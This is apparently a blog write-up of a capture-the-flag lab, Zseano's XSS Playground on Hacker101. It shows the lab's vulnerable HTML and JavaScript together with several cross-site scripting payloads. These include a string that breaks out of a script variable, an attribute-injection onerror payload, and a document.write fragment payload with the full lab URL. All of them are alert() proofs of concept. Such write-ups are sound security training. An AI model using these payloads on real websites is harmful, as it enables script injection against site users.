---
title: (Portswigger/WebAcademy) - Zseano's XSS Playground
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-25 09:00:00 +0200
categories: [Web Application, Stored XSS]
tags: [Notes, Stored XSS, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
It's all about XSSes.
Hackerone CTF.

![picture 1](/assets/images/ee50e5cdb3119a1cc76da24f1a0cde54cc1ff4b8930f3e36a6dfd2721590bd8b.png)  

That's a lot of XSSes, now let's hunt.

## TOC

# Reflective

# Stored

Payload: `canary'"</>`

We get 2 matches (search for `canary`):

```html
                        <h6> <img src="guest.png" alt="profile" class="img-sm rounded-circle">
                          Guest
                          <small class="ml-4 text-muted"><i class="fas fa-star" style="background-color:yellow"></i> New comment!</small>
                        </h6>
                        canary'"<script>var commentContent='canary'&quot;';</script>
```

One entry is in the enclosed in `<script>` tags.
Another entry is outside the `<h6>` tags.

In both cases the single quotes are not escaped.

## Stored XSS in between script tags in the comment field

Payload:
```
' ; alert(window.location); var xyz=' 
```

If we drop a comment with the payload above we'll get XSS to trigger

![picture 2](/assets/images/349e5842175d5470b63942fda48a8f58c79048651688e788a8d0827f27fc8f62.png)  

This is the HTML
```html
<script>var commentContent='' ; alert(window.location); var xyz=' ';</script>
```

## Stored XSS outside script tags w/ script
If i enter something like
```html
<img src=x>
test
</img>
```

I end with `" test "`, so tags are stripped.


# DOM
## DOM-based XSS on Report User
We can report user using button entitled `Report User` which opens a form. 

Test payload: `<IMG SRC=x onmouseover=alert(1)>`

![picture 4](/assets/images/6a7eebf951033d8b85ae39b60ad8a27134f087046d4849573e0a6801cbd9d55f.png)

After blindly trying XSS and checking what's loaded on the page it's obvious that `img` has landed on page, but not the `onmouseover`. 

![picture 3](/assets/images/9e8a919c1ce4e0e14c1cdfc008fc14314fd488654b37272b05570853059b24a9.png)  

After checking the form it became obvious that value is loaded into DOM.

```html
<button type="button" class="btn btn-danger" onclick="reportUsera(document.getElementById('usernamea').value, document.getElementById('msgreport').value);" data-dismiss="modal">Report User</button>
```

```
)" onerror=alert(1) src="test(1
```

## DOM-based XSS on document.write sink
XSS Vuln exists in `custom.js`

```js
var hash = window.location.hash.substr(1);
var result = hash.split("&").reduce(function(e, t) {
    var n = t.split("=");
    return e[n[0]] = n[1],
    e
}, {});
var tracking = JSON.stringify(result);
var who = (tracking = JSON.parse(tracking)).who;
...SNIP...
1 == who.includes("zsh1") && document.write("<img src=/1x1.gif?" + decodeURI(who) + "></img>");
```

We can exploit the XSS.

```
https://7dcf5189685458a9eab3e7ebecf08303.ctf.hacker101.com/#who=zsh1%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

This is the actual payload after the fragment starts:
```
#who=zsh1"><script>alert(1)</script>
```

![picture 1](images/36968f603d58e79f28b9e03b874c8a2966adf7c5fad9b6c48fbd1aaf2f060f94.png)  
